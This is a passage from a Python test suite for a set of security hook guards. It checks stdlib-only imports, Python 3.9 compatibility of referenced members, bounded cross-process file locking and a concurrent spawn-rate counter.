            if resolved == "missing" and name in PLATFORM_OPTIONAL and guarded:
                continue
            violations.append(
                "%s%s.py:%d imports %r (%s%s)"
                % (where, module, line, name, resolved,
                   "" if guarded else ", not inside a try"))
    return violations


_static_violations = _census("", _ALL_IMPORTS, set(MODULES))
check(not _static_violations,
      "every import at every depth is stdlib, local or a named exception: %s"
      % _static_violations)

_test_violations = _census("tests/", _TEST_IMPORTS,
                           set(MODULES) | set(_TEST_MODULES))
check(not _test_violations,
      "every import in tests/ is stdlib, local or a named exception: %s"
      % _test_violations)

_embedded_violations = _census("", _EMBEDDED_IMPORTS,
                               set(MODULES) | set(_TEST_MODULES))
check(not _embedded_violations,
      "every import in a shell script's embedded Python is stdlib, local or a "
      "named exception -- three of these run on a hook path: %s"
      % _embedded_violations)

# The exceptions are exercised, not merely declared: a stale exception that no
# longer names a real import would otherwise sit here forever.
check(any(_n == "yaml" for _n, _l, _g in _ALL_IMPORTS[NON_RUNTIME]),
      "%s.py still carries the one declared third-party import" % NON_RUNTIME)
check(any(_n == "msvcrt" and _g for _n, _l, _g in _ALL_IMPORTS["portable_lock"]),
      "portable_lock still imports msvcrt inside a try")
# The symmetric pin, on the POSIX side, which nothing asserted: the census above
# now reports an unguarded platform-optional import regardless of resolution,
# and this names the file it was written for so a stale rule cannot sit here.
check(any(_n == "fcntl" and _g for _n, _l, _g in _TEST_IMPORTS["_fake_msvcrt"]),
      "tests/_fake_msvcrt.py still imports fcntl inside a try -- the helper "
      "that models Windows must itself be importable on Windows")

# An import nobody uses is dead code, and this rework created nine of them at
# once: `parse_event()` and `emit()` replaced `json.loads(sys.stdin.read())` and
# `json.dump(x, sys.stdout)` in all fifteen guards, and the `import json` stayed
# behind in nine of them. Round 1's dead-code sweep ran BEFORE the remediation
# that created them, so it could not have seen them, and nothing else looks.
# They are also nine of the thirteen findings in ruff's whole output (F401),
# against a standing zero-warnings policy.
#
# Deliberately narrow: module-scope `import x` / `import x as y` only. A
# `from x import y` re-export is a real pattern here (`hook_event`'s readers,
# `credential_guard`'s `CREDENTIAL_PATTERNS`) and a `# noqa` on the line is
# taken at its word, as it is everywhere else in this tree.
def _unused_module_imports(source, label):
    tree = ast.parse(source, filename=label)
    lines = source.splitlines()
    bound = {}
    for node in tree.body:
        if not isinstance(node, ast.Import):
            continue
        if "noqa" in (lines[node.lineno - 1] if node.lineno <= len(lines) else ""):
            continue
        for alias in node.names:
            bound[alias.asname or alias.name.split(".")[0]] = node.lineno
    if not bound:
        return []
    used = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Name):
            used.add(node.id)
        elif isinstance(node, ast.Attribute):
            root = _attribute_chain(node)
            if root:
                used.add(root.split(".")[0])
        elif isinstance(node, ast.Constant) and isinstance(node.value, str):
            used.add(node.value)
    return ["%s:%d imports %r and never uses it" % (label, line, name)
            for name, line in sorted(bound.items()) if name not in used]


_dead_imports = []
for _module in sorted(MODULES):
    _path = HOOKS / (_module + ".py")
    _dead_imports.extend(_unused_module_imports(
        _path.read_text(encoding="utf-8"), _module + ".py"))
check(not _dead_imports,
      "no hook module carries an import it never uses: %s" % _dead_imports[:8])

print("PASS: importing every hook pulls in nothing outside the standard library, "
      "at module scope or inside any function")


# =============================================================================
# 3b. Every stdlib member referenced exists on the floor interpreter
# =============================================================================
#
# The last member of the class the grammar gate and the import gates cannot see.
# `itertools.pairwise` (3.10), `contextlib.chdir` (3.11) and `int.bit_count`
# (3.10) are valid 3.9 SYNTAX and import 3.9 modules; they fail at CALL time,
# which no probe that imports a module and walks `sys.modules` can observe.
# Measured: all three escaped every suite on 3.9.6 and on 3.14.6 alike, including
# one placed in an `except` branch -- the exact shape that turns a computed deny
# into a fail-open silent allow only on the rare path.
#
# Two gates, because neither alone is enough.
#
# The first is dynamic: resolve every `module.attribute` (flat OR dotted, so
# `os.path.splitroot` counts) and every `from module import name` in the tree
# against the FLOOR interpreter, which section 0 chose rather than inherited. On
# a host that has a 3.9 this answers the question exactly FOR THOSE SHAPES. It
# is not complete over the tree and the word was withdrawn on 2026-08-02: it
# cannot see a member reached through anything but a bare-name-rooted attribute
# chain, and it does not see the five embedded shell programs at all unless
# their extracted source is fed in -- which `_MEMBER_SOURCES` now does. On a
# host with no 3.9 it answers a weaker question again, and section 0's banner
# says so.
#
# The second is static and interpreter-independent: a named list of post-3.9
# members. It is a denylist and therefore incomplete by construction, but it does
# not depend on any interpreter being present, and it covers the shapes the
# dynamic probe structurally cannot -- a method on a builtin instance
# (`n.bit_count()`), a keyword argument (`@dataclass(slots=True)`), and a bare
# builtin name (`ExceptionGroup`).

_MEMBER_SOURCES = (
    [("%s.py" % m, (HOOKS / (m + ".py")).read_text(encoding="utf-8"))
     for m in MODULES]
    + [("tests/%s.py" % t, (TESTS / (t + ".py")).read_text(encoding="utf-8"))
       for t in _TEST_MODULES]
    + list(_EMBEDDED_MEMBER_SOURCES)
)


# Members that exist only on one platform. Each is allowed exactly on the terms
# the import gate uses for `fcntl` and `msvcrt`: named here, AND referenced from
# inside a `try`. An unguarded reference to one of these is the same defect as an
# unguarded `import fcntl`, one call deeper.
PLATFORM_OPTIONAL_MEMBERS = frozenset({
    ("os", "memfd_create"),        # Linux
    ("os", "MFD_ALLOW_SEALING"),   # Linux
    ("socket", "SOCK_CLOEXEC"),    # Linux
    ("os", "O_BINARY"),            # Windows
    ("os", "getuid"),              # POSIX
    ("os", "getppid"),             # POSIX
})


def _stdlib_member_refs(source, label, local):
    """``(module, member, lineno, inside_try)`` for every stdlib member named."""
    tree = ast.parse(source, filename=label)
    guarded = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Try):
            for sub in ast.walk(node):
                guarded.add(id(sub))
    aliases, refs = {}, []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                # `import a.b` binds the name `a`, not `a.b`. Binding the dotted
                # name here made `urllib.request` resolve against the module
                # `urllib.request` and report its own name missing.
                if alias.asname:
                    aliases[alias.asname] = alias.name
                else:
                    aliases[alias.name.split(".")[0]] = alias.name.split(".")[0]
        elif isinstance(node, ast.ImportFrom) and node.module and not node.level:
            if node.module.split(".")[0] in local:
                continue
            for alias in node.names:
                if alias.name == "*":
                    continue
                refs.append((node.module, alias.name, node.lineno,
                             id(node) in guarded))
                # ROUND 1: `from urllib import request` binds `request` to the
                # SUBMODULE `urllib.request`, and neither alias table modelled
                # that -- so `request.<member>` was dropped before either the
                # static or the dynamic gate saw it, on BOTH floors. A mutant
                # of exactly that shape in `exfil_guard` (a PreToolUse[Bash]
                # guard) turns a computed deny into an AttributeError and a
                # fail-open silent allow on a host with no 3.9 interpreter.
                #
                # Whether the name is a submodule or a plain attribute cannot be
                # decided statically, and it does not have to be: the dynamic
                # probe below imports the dotted name and skips what will not
                # import, so `from json import dumps` contributes the harmlessly
                # unimportable `json.dumps` and `from urllib import request`
                # contributes the real module.
                aliases.setdefault(alias.asname or alias.name,
                                   node.module + "." + alias.name)
    for node in ast.walk(tree):
        if not isinstance(node, ast.Attribute):
            continue
        receiver = _attribute_chain(node.value)
        if receiver is None:
            continue
        root, _, rest = receiver.partition(".")
        full = aliases.get(root)
        if full is None or full.split(".")[0] in local:
            continue
        if rest:
            full = full + "." + rest
        refs.append((full, node.attr, node.lineno, id(node) in guarded))
    return refs


_MEMBER_REFS = []
_MEMBER_GUARDED = {}
for _label, _source in _MEMBER_SOURCES:
    _local = set(MODULES) | set(_TEST_MODULES)
    for _mod, _member, _line, _guard in _stdlib_member_refs(_source, _label,
                                                            _local):
        _at = "%s:%d" % (_label, _line)
        _MEMBER_REFS.append([_mod, _member, _at])
        _MEMBER_GUARDED[(_at, _mod, _member)] = _guard

check(len(_MEMBER_REFS) > 300,
      "the member census found the references (%d)" % len(_MEMBER_REFS))

_MEMBER_PROBE = r"""
import importlib, json, sys
missing = []
checked = 0
for module, member, where in json.loads(sys.stdin.read()):
    try:
        loaded = importlib.import_module(module)
    except Exception:
        continue          # an unimportable module is section 3's business
    checked += 1
    if hasattr(loaded, member):
        continue
    try:
        importlib.import_module(module + "." + member)
        continue          # a submodule, not a missing member
    except Exception:
        pass
    missing.append([where, module, member])
print(json.dumps({"checked": checked, "missing": missing}))
"""

_proc = subprocess.run(
    [PROBE_PY, "-c", _MEMBER_PROBE], input=json.dumps(_MEMBER_REFS),
    capture_output=True, text=True,
    env=dict(os.environ, PYTHONDONTWRITEBYTECODE="1"),
)
check(_proc.returncode == 0,
      "the stdlib member probe ran: %s" % _proc.stderr[-300:])
_members = json.loads(_proc.stdout.strip().splitlines()[-1])
check(_members["checked"] > 300,
      "the member probe resolved the references (%d)" % _members["checked"])

_member_violations = []
for _at, _mod, _member in _members["missing"]:
    _key = (_mod.split(".")[0], _member)
    if _key in PLATFORM_OPTIONAL_MEMBERS and _MEMBER_GUARDED.get((_at, _mod, _member)):
        continue
    _member_violations.append(
        "%s: %s.%s%s" % (_at, _mod, _member,
                         "" if _key in PLATFORM_OPTIONAL_MEMBERS
                         else "", ))
check(not _member_violations,
      "every stdlib member exists on the probe interpreter (%s), or is a named "
      "platform-optional one inside a try: %s"
      % (".".join(str(p) for p in PROBE_VERSION), _member_violations[:8]))

# The platform-optional exceptions are exercised rather than merely declared.
check(any(_m == "memfd_create" for _a, _mo, _m in _members["missing"])
      or sys.platform.startswith("linux"),
      "the platform-optional member list names something real on this host")

# The interpreter-independent half. Every entry is a member that does not exist
# on 3.9 and whose absence is a runtime error, not a syntax error.
_POST_39_NAMES = {
    "ExceptionGroup": "3.11", "BaseExceptionGroup": "3.11",
    "EncodingWarning": "3.10", "aiter": "3.10", "anext": "3.10",
    "tomllib": "3.11",
}
_POST_39_MEMBERS = {
    ("itertools", "pairwise"): "3.10",
    ("contextlib", "chdir"): "3.11",
    ("contextlib", "aclosing"): "3.10",
    ("dataclasses", "KW_ONLY"): "3.10",
    ("types", "NoneType"): "3.10",
    ("types", "EllipsisType"): "3.10",
    ("enum", "StrEnum"): "3.11", ("enum", "ReprEnum"): "3.11",
    ("enum", "verify"): "3.11", ("enum", "global_enum"): "3.11",
    ("typing", "Self"): "3.11", ("typing", "Never"): "3.11",
    ("typing", "LiteralString"): "3.11", ("typing", "assert_type"): "3.11",
    ("typing", "assert_never"): "3.11", ("typing", "reveal_type"): "3.11",
    ("typing", "dataclass_transform"): "3.11", ("typing", "override"): "3.12",
    ("typing", "TypeAlias"): "3.10", ("typing", "ParamSpec"): "3.10",
    ("typing", "Concatenate"): "3.10", ("typing", "TypeGuard"): "3.10",
    ("typing", "is_typeddict"): "3.10",
    ("typing", "Required"): "3.11", ("typing", "NotRequired"): "3.11",
    ("typing", "TypeVarTuple"): "3.11", ("typing", "Unpack"): "3.11",
    ("asyncio", "TaskGroup"): "3.11", ("asyncio", "timeout"): "3.11",
    ("asyncio", "timeout_at"): "3.11", ("asyncio", "Runner"): "3.11",
    ("math", "cbrt"): "3.11", ("math", "exp2"): "3.11",
    ("hashlib", "file_digest"): "3.11",
    ("inspect", "getmembers_static"): "3.11",
    ("datetime", "UTC"): "3.11",
    ("re", "NOFLAG"): "3.11",
    ("sys", "exception"): "3.11", ("sys", "last_exc"): "3.12",
    ("os", "process_cpu_count"): "3.13",
    ("shutil", "COPY_BUFSIZE"): "3.14",
    ("unittest", "enterModuleContext"): "3.11",
    ("pathlib", "UnsupportedOperation"): "3.13",
    ("itertools", "batched"): "3.12",
    ("statistics", "correlation"): "3.10",
    # Keyed on the DOTTED receiver, which is why `_attribute_chain` exists.
    # Measured rather than recalled: `dir(os.path)` gained five public names
    # between 3.9.6 and 3.14.6, and `os.path` is the single most referenced
    # dotted receiver in this tree (180 of the 270 dotted references).
    ("os.path", "splitroot"): "3.12",
    ("os.path", "isjunction"): "3.12",
    ("os.path", "isdevdrive"): "3.12",
    ("os.path", "ALLOW_MISSING"): "3.13",
}
# Method names that only exist on a builtin instance from 3.10+, so no module
# attribute carries them and the dynamic probe above cannot see them.
# A method called on an INSTANCE produces no `module.attribute` node and no
# `from module import name`, so the dynamic probe is structurally blind to it on
# every interpreter, floor or not. This table is the only thing that sees it, and
# it is matched on the attribute name ALONE — so a name that also exists
# somewhere on the 3.9 floor cannot go in it without false-alarming.
#
# Measured rather than recalled: `python:3.9-slim` and `python:3.14-slim` were
# both asked for `dir()` of every type this tree instantiates, and a name
# qualifies here only when it is absent from the ENTIRE 3.9 dump. That rules out
# `copy`, `move`, `info`, `walk`, `is_integer` and `strptime`, which are all new
# on some type in 3.12+ and all old somewhere else (`shutil.move`, `os.walk`,
# `logging.Logger.info`, `float.is_integer`, `datetime.strptime`); those are
# covered receiver-first by `_POST_39_PATH_METHODS` below instead.
_POST_39_METHODS = {
    "bit_count": "3.10 (int.bit_count)",
    "hardlink_to": "3.10 (Path.hardlink_to)",
    "is_junction": "3.12 (Path.is_junction)",
    "full_match": "3.13 (PurePath.full_match)",
    "from_uri": "3.13 (Path.from_uri)",
    "with_segments": "3.12 (PurePath.with_segments)",
    "copy_into": "3.14 (Path.copy_into)",
    "move_into": "3.14 (Path.move_into)",
    "from_number": "3.14 (float.from_number)",
    "getChildren": "3.12 (Logger.getChildren)",
}
# The same class of member, but where the NAME is ambiguous and the RECEIVER is
# not: `Path(p).walk()` is 3.12 and `os.walk(p)` is ancient, and the difference
# is visible in the AST. Matched only when the receiver is a literal
# `Path(...)`/`PurePath(...)` construction.
_POST_39_PATH_METHODS = {
    "walk": "3.12 (Path.walk)",
    "copy": "3.14 (Path.copy)",
    "move": "3.14 (Path.move)",
    "info": "3.14 (Path.info)",
}
_PATH_CONSTRUCTORS = frozenset({
    "Path", "PurePath", "PosixPath", "WindowsPath",
    "PurePosixPath", "PureWindowsPath",
})
# Keyword arguments introduced after 3.9 on calls this tree could plausibly make.
# Measured the same way, by diffing `inspect.signature` across the two images for
# every stdlib callable in this tree's vocabulary; a keyword is a 3.10+ runtime
# TypeError on the floor and valid 3.9 syntax, so no grammar gate can see it.
_POST_39_KEYWORDS = {
    ("dataclass", "slots"): "3.10", ("dataclass", "kw_only"): "3.10",
    ("dataclass", "match_args"): "3.10",
    ("dataclass", "weakref_slot"): "3.11",
    ("field", "kw_only"): "3.10", ("field", "doc"): "3.14",
    ("zip", "strict"): "3.10",
    ("rmtree", "onexc"): "3.12", ("rmtree", "dir_fd"): "3.13",
    ("TemporaryDirectory", "ignore_cleanup_errors"): "3.10",
    ("TemporaryDirectory", "delete"): "3.12",
    ("NamedTemporaryFile", "delete_on_close"): "3.12",
    ("Popen", "pipesize"): "3.10", ("Popen", "process_group"): "3.11",
    ("run", "pipesize"): "3.10", ("run", "process_group"): "3.11",
    ("glob", "root_dir"): "3.10", ("glob", "dir_fd"): "3.10",
    ("glob", "include_hidden"): "3.11",
    ("glob", "case_sensitive"): "3.12", ("glob", "recurse_symlinks"): "3.13",
    ("iglob", "root_dir"): "3.10", ("iglob", "dir_fd"): "3.10",
    ("iglob", "include_hidden"): "3.11",
    ("rglob", "case_sensitive"): "3.12", ("rglob", "recurse_symlinks"): "3.13",
    ("read_text", "newline"): "3.13", ("write_text", "newline"): "3.10",
    ("create_connection", "all_errors"): "3.11",
    ("signature", "eval_str"): "3.10",
    ("ArgumentParser", "suggest_on_error"): "3.14",
    ("ArgumentParser", "color"): "3.14",
}

def _is_path_call(node):
    """Whether ``node`` is a literal ``Path(...)`` / ``pathlib.Path(...)`` call."""
    if not isinstance(node, ast.Call):
        return False
    func = node.func
    if isinstance(func, ast.Name):
        return func.id in _PATH_CONSTRUCTORS
    if isinstance(func, ast.Attribute):
        return func.attr in _PATH_CONSTRUCTORS
    return False


def _post_39_hits(source, label):
    """Every named post-3.9 member one unit of source references."""
    hits = []
    try:
        tree = ast.parse(source, filename=label)
    except SyntaxError:
        return hits                 # gate_39 owns syntax; this owns members
    aliases = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                # ROUND 1: `import a.b` binds the name `a`, NOT `a.b` -- the
                # same rule `_stdlib_member_refs` already carried and this half
                # did not. Binding the dotted name made `os.path.splitroot`
                # resolve as `os.path.path.splitroot`, so neither of the two
                # keys tried below matched the `("os.path", "splitroot")` row on
                # the denylist and `D2-dotted-import-os-path` escaped on a host
                # with no 3.9 interpreter, where this static half is the only
                # gate there is. `import a.b as x` DOES bind `x` to `a.b`.
                if alias.asname:
                    aliases[alias.asname] = alias.name
                else:
                    aliases[alias.name.split(".")[0]] = alias.name.split(".")[0]
        # ROUND 1: `from typing import Self` creates no `typing.Self` Attribute
        # node and no `Self` Name node, so the `("typing", "Self")` entry
        # already sitting in _POST_39_MEMBERS never fired and six members --
        # typing.Self, itertools.pairwise, contextlib.chdir, datetime.UTC,
        # asyncio.TaskGroup, enum.StrEnum -- were invisible to this half.
        # That matters because this half is the one documented as "static and
        # interpreter-independent": section 0 explicitly anticipates a host with
        # no 3.9 interpreter, and on `python:3.14-slim` all six escaped the
        # whole suite. The dynamic probe covered them only because THIS host
        # happens to have the floor installed.
        elif isinstance(node, ast.ImportFrom):
            if not node.module or node.level:
                continue
            root = node.module.split(".")[0]
            for alias in node.names:
                # ROUND 1, second half: `from urllib import request` binds
                # `request` to the SUBMODULE `urllib.request`, and neither alias
                # table modelled it -- so `request.<member>` was dropped before
                # either gate saw it, on BOTH floors. Registered here so the
                # Attribute walk below resolves the dotted name.
                if alias.name != "*":
                    aliases.setdefault(alias.asname or alias.name,
                                       node.module + "." + alias.name)
                key = (root, alias.name)
                if key in _POST_39_MEMBERS:
                    hits.append("%s:%d from %s import %s (%s)"
                                % (label, node.lineno, node.module, alias.name,
                                   _POST_39_MEMBERS[key]))
                if alias.name in _POST_39_NAMES:
                    hits.append("%s:%d from %s import %s (%s)"
                                % (label, node.lineno, node.module, alias.name,
                                   _POST_39_NAMES[alias.name]))
    for node in ast.walk(tree):
        if isinstance(node, ast.Name) and node.id in _POST_39_NAMES:
            hits.append("%s:%d %s (%s)"
                        % (label, node.lineno, node.id, _POST_39_NAMES[node.id]))
        elif isinstance(node, ast.Attribute):
            # The receiver is resolved as a CHAIN, not as a bare name: keyed on
            # `ast.Name` alone this half was blind to `os.path.splitroot` in the
            # same way the dynamic probe was, so neither gate saw the 180
            # `os.path.*` references in this tree.
            receiver = _attribute_chain(node.value)
            if receiver is not None:
                root, _, rest = receiver.partition(".")
                module = aliases.get(root, root)
                dotted = module + ("." + rest if rest else "")
                for key in ((dotted, node.attr),
                            (module.split(".")[0], node.attr)):
                    if key in _POST_39_MEMBERS:
                        hits.append("%s:%d %s.%s (%s)"
                                    % (label, node.lineno, key[0], key[1],
                                       _POST_39_MEMBERS[key]))
                        break
            if node.attr in _POST_39_METHODS:
                hits.append("%s:%d .%s (%s)"
                            % (label, node.lineno, node.attr,
                               _POST_39_METHODS[node.attr]))
            if node.attr in _POST_39_PATH_METHODS and _is_path_call(node.value):
                hits.append("%s:%d Path(...).%s (%s)"
                            % (label, node.lineno, node.attr,
                               _POST_39_PATH_METHODS[node.attr]))
        elif isinstance(node, ast.Call):
            name = None
            if isinstance(node.func, ast.Name):
                name = node.func.id
            elif isinstance(node.func, ast.Attribute):
                name = node.func.attr
            for keyword in node.keywords:
                if keyword.arg and (name, keyword.arg) in _POST_39_KEYWORDS:
                    hits.append("%s:%d %s(%s=) (%s)"
                                % (label, node.lineno, name, keyword.arg,
                                   _POST_39_KEYWORDS[(name, keyword.arg)]))
    for node in ast.walk(tree):
        for decorator in getattr(node, "decorator_list", []):
            if not isinstance(decorator, ast.Call):
                continue
            name = (decorator.func.attr
                    if isinstance(decorator.func, ast.Attribute)
                    else getattr(decorator.func, "id", None))
            for keyword in decorator.keywords:
                if keyword.arg and (name, keyword.arg) in _POST_39_KEYWORDS:
                    hits.append("%s:%d @%s(%s=) (%s)"
                                % (label, node.lineno, name, keyword.arg,
                                   _POST_39_KEYWORDS[(name, keyword.arg)]))
    return hits


# `_MEMBER_SOURCES` carries the embedded shell programs, so this covers them
# too. The Python embedded in the shell scripts runs under the same interpreter
# and was covered by the grammar gate alone -- which passes
# `itertools.pairwise`, because that is valid 3.9 syntax and a 3.10 runtime
# error. Measured: a `python3 -u - <<TAG` block containing exactly that escaped
# every suite.
_post39 = []
for _label, _source in _MEMBER_SOURCES:
    _post39.extend(_post_39_hits(_source, _label))

check(len(_EMBEDDED_MEMBER_SOURCES) >= 2,
      "the embedded script programs reached the member gate (%d)"
      % len(_EMBEDDED_MEMBER_SOURCES))

check(not sorted(set(_post39)),
      "no post-3.9 stdlib member is named anywhere, embedded shell programs "
      "included: %s" % sorted(set(_post39))[:8])

print("PASS: every stdlib member resolves on the %s floor probe (%d references) "
      "and no named post-3.9 member appears"
      % (".".join(str(p) for p in PROBE_VERSION), _members["checked"]))


# =============================================================================
# 4. portable_lock: semantics, and real cross-process exclusion on both branches
# =============================================================================

check(portable_lock.platform_backend() in ("fcntl.flock", "msvcrt.locking"),
      "a locking primitive is available (%s)" % portable_lock.platform_backend())

_fd, _path = tempfile.mkstemp(prefix="forcefield-lock-nb-")
os.close(_fd)
_a = open(_path, "r+b")
_b = open(_path, "r+b")
_lock_a = portable_lock.FileLock(_a, timeout=0)
check(_lock_a.acquire() is True, "the first acquisition succeeds")
_lock_b = portable_lock.FileLock(_b, timeout=0)
check(_lock_b.acquire() is False, "a second acquisition on a held lock fails")
check(_lock_b.locked is False, "and it does not claim to hold what it did not take")
_lock_a.release()
check(_lock_b.acquire() is True, "the lock is available again after release")
_lock_b.release()
_lock_b.release()  # idempotent: release on an unheld lock is a no-op, not a raise
check(True, "releasing an unheld lock is a no-op rather than an error")
_a.close()
_b.close()

# The deadline is honoured and bounded. This is the property both unbounded call
# sites lacked: a hook has 5s, so a lock that can wait forever can convert a
# computed hard deny into a killed process and a silent allow.
_a = open(_path, "r+b")
_b = open(_path, "r+b")
_holder = portable_lock.FileLock(_a, timeout=0)
check(_holder.acquire() is True, "the holder took the lock")
_waiter = portable_lock.FileLock(_b, timeout=0.30)
_started = time.monotonic()
check(_waiter.acquire() is False, "a bounded wait gives up rather than hanging")
_waited = time.monotonic() - _started
check(0.25 <= _waited <= 2.0,
      "the wait was ~0.30s, measured %.3fs" % _waited)
_holder.release()
_a.close()
_b.close()

# A closed handle must not raise out of release(): release() runs in `finally`
# blocks, where an exception would replace the caller's own.
_c = open(_path, "r+b")
_lock_c = portable_lock.FileLock(_c, timeout=0)
_lock_c.acquire()
_c.close()
_lock_c.release()
check(True, "release on a closed handle is swallowed, not raised")
_lock_d = portable_lock.FileLock(_c, timeout=0)
check(_lock_d.acquire() is False, "acquiring on a closed handle reports False")
os.unlink(_path)

with portable_lock.locked_handle(None) as _ok:
    check(_ok is False, "locked_handle(None) reports unlocked rather than raising")

_WORKER = r"""
import os, sys, time
sys.path.insert(0, %(tests)r)
BACKEND = %(backend)r
if BACKEND == "nt":
    # Import the stand-in BEFORE fcntl is blocked -- it is built on fcntl.lockf,
    # which is what gives the emulation real byte-range semantics.
    import _fake_msvcrt
    sys.modules["msvcrt"] = _fake_msvcrt
    import builtins
    real_import = builtins.__import__

    def no_fcntl(name, *a, **k):
        if name == "fcntl":
            raise ImportError("blocked, so portable_lock takes the NT branch")
        return real_import(name, *a, **k)

    builtins.__import__ = no_fcntl
    sys.path.insert(0, %(hooks)r)
    import portable_lock
    builtins.__import__ = real_import
    assert portable_lock.platform_backend() == "msvcrt.locking", \
        "the NT branch was not taken"
else:
    sys.path.insert(0, %(hooks)r)
    import portable_lock

path = sys.argv[1]
rounds = int(sys.argv[2])
got = 0
for _ in range(rounds):
    with open(path, "r+") as handle:
        lock = portable_lock.FileLock(handle, timeout=20.0)
        if not lock.acquire():
            continue
        try:
            handle.seek(0)
            value = int(handle.read().strip() or "0")
            time.sleep(0.001)          # widen the window a lost update needs
            handle.seek(0)
            handle.truncate()
            handle.write(str(value + 1))
            handle.flush()
            os.fsync(handle.fileno())
            got += 1
        finally:
            lock.release()
print(got)
"""

PROCESSES = 8
ROUNDS = 25


def run_contention(backend):
    """N processes hammer one counter through the lock. Returns (claimed, final)."""
    fd, path = tempfile.mkstemp(prefix="forcefield-lock-race-")
    os.write(fd, b"0")
    os.close(fd)
    code = _WORKER % {"tests": str(TESTS), "hooks": str(HOOKS), "backend": backend}
    children = [
        subprocess.Popen([sys.executable, "-c", code, path, str(ROUNDS)],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        for _ in range(PROCESSES)
    ]
    claimed = 0
    for child in children:
        out, err = child.communicate(timeout=180)
        check(child.returncode == 0,
              "a %s worker finished cleanly: %s" % (backend, err.decode()[-300:]))
        claimed += int(out.decode().strip())
    with open(path) as handle:
        final = int(handle.read().strip())
    os.unlink(path)
    return claimed, final


for _backend in ("posix", "nt"):
    _claimed, _final = run_contention(_backend)
    print("  %-5s branch: %d acquisitions, counter=%d, expected=%d"
          % (_backend, _claimed, _final, PROCESSES * ROUNDS))
    check(_claimed == PROCESSES * ROUNDS,
          "%s: every worker got the lock (%d of %d)"
          % (_backend, _claimed, PROCESSES * ROUNDS))
    check(_final == PROCESSES * ROUNDS,
          "%s: no lost updates -- the counter is exactly %d, got %d"
          % (_backend, PROCESSES * ROUNDS, _final))

print("PASS: the lock excludes across processes on both branches, and every wait "
      "is bounded")


# =============================================================================
# 5. The call sites keep the exact semantics they had under raw fcntl
# =============================================================================
#
# The abstraction is only correct if each site's blocking behaviour survived it.
# ``memo._store_lock(blocking=False)`` is the hook read path and must not wait;
# ``blocking=True`` is the slash-command write path and must.

import memo as _memo  # noqa: E402

_LOCK_HOLDER = r"""
import os, sys, time
sys.path.insert(0, %(hooks)r)
import portable_lock
handle = os.fdopen(os.open(sys.argv[1], os.O_RDWR | os.O_CREAT, 0o600), "r+b")
lock = portable_lock.FileLock(handle, timeout=0)
assert lock.acquire(), "the holder could not take an uncontended lock"
print("held", flush=True)
time.sleep(float(sys.argv[2]))
""" % {"hooks": str(HOOKS)}


def hold_memo_lock(seconds):
    """Another *process* holds the memo store lock. Returns the child."""
    _memo._ensure_store_dir()
    child = subprocess.Popen(
        [sys.executable, "-c", _LOCK_HOLDER, str(_memo._lock_path()), str(seconds)],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
    )
    check(child.stdout.readline().strip() == "held",
          "the holder process reported taking the memo lock")
    return child


_child = hold_memo_lock(6.0)
try:
    _started = time.monotonic()
    with _memo._store_lock(blocking=False) as _held:
        _elapsed = time.monotonic() - _started
        check(_held is None, "the non-blocking form yields None under contention")
    check(_elapsed < 1.0,
          "the non-blocking form returned in %.3fs, without waiting" % _elapsed)

    _started = time.monotonic()
    with _memo._store_lock(blocking=True) as _held:
        _elapsed = time.monotonic() - _started
        check(_held is None,
              "the blocking form gives up rather than outlasting the hook budget")
    check(0.5 <= _elapsed < 3.0,
          "the blocking form waited out its deadline (%.3fs) instead of returning "
          "at once or hanging" % _elapsed)
finally:
    _child.kill()
    _child.wait()

# Uncontended, both forms take the lock and hand back a usable handle.
for _blocking in (True, False):
    with _memo._store_lock(blocking=_blocking) as _held:
        check(_held is not None,
              "an uncontended lock is taken (blocking=%s)" % _blocking)

print("PASS: the memo read path still refuses to wait and the write path still "
      "waits, now with a deadline")

# The spawn budget: the same lost-update race the lock exists to prevent, over
# the real ``_bump_spawn_count``.
import agent_guard as _ag  # noqa: E402

_BUMP_WORKER = r"""
import json, pathlib, sys, time
sys.path.insert(0, %(hooks)r)
import agent_guard
path = pathlib.Path(sys.argv[1])
now = float(sys.argv[2])
rounds = int(sys.argv[3]) if len(sys.argv) > 3 else %(rounds)d
out = [agent_guard._bump_spawn_count(path, now) for _ in range(rounds)]
print(json.dumps({"returns": out}))
""" % {"hooks": str(HOOKS), "rounds": 10}

_state = Path(tempfile.mkdtemp(prefix="forcefield-spawn-")) / "spawn-x.json"
_children = [
    subprocess.Popen([sys.executable, "-c", _BUMP_WORKER, str(_state), str(time.time())],
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    for _ in range(6)
]
_returns = []
for _child in _children:
    _out, _err = _child.communicate(timeout=180)
    check(_child.returncode == 0, "a spawn-budget worker finished cleanly: %s" % _err)
    _returns.append(_out)
_recorded = [_l for _l in _state.read_text().splitlines() if _l.strip()]
check(len(_recorded) == 60,
      "60 spawns are recorded after 6 processes x 10 bumps, got %d"
      % len(_recorded))
check(all(_l.count(".") == 1 and _l.replace(".", "").isdigit()
          for _l in _recorded),
      "every non-empty line is a whole timestamp -- no interleaved half-writes")
check(_ag._spawn_window_count(_state, time.time()) == 60,
      "and the window count agrees with the file")

_per_worker = [json.loads(_out)["returns"] for _out in _returns]
_all_returns = sorted(v for _seq in _per_worker for v in _seq)
check(len(_all_returns) == 60, "60 bumps reported a count")
# A strict permutation of 0..59 is no longer the right property, and asserting
# it would be asserting serialisation rather than correctness. Appending and
# then counting means two genuinely concurrent spawns can both observe the same
# larger file and report the same number -- neither of them UNDER-reports, which
# is the only direction that matters for a limit. What must hold is that no
# spawn is missing (asserted above, against the file) and that no reader ever
# sees fewer than what is durably recorded.
check(max(_all_returns) == 59,
      "the last bump to read saw all 59 others, because the read follows the "
      "append (max %d)" % max(_all_returns))
check(min(_all_returns) < 6,
      "the first bump to read saw at most one entry per concurrent process, "
      "so nothing is over-counted beyond genuine concurrency (min %d)"
      % min(_all_returns))
check(all(0 <= _v < 60 for _v in _all_returns),
      "no bump reported a count outside 0..59")
for _seq in _per_worker:
    check(_seq == sorted(_seq),
          "one worker's own counts never go backwards: %r" % _seq)

print("PASS: the spawn budget still counts every concurrent bump")


# ...and the case that made it a rate limiter in name only. Three shapes of this
# counter have now been measured. Unlocked read-modify-write lost 3 of 6 updates
# and once left the file as invalid JSON. An unbounded lock outlasted the 5 s
# hook timeout and took the verdict with it. A BOUNDED lock obeyed its deadline
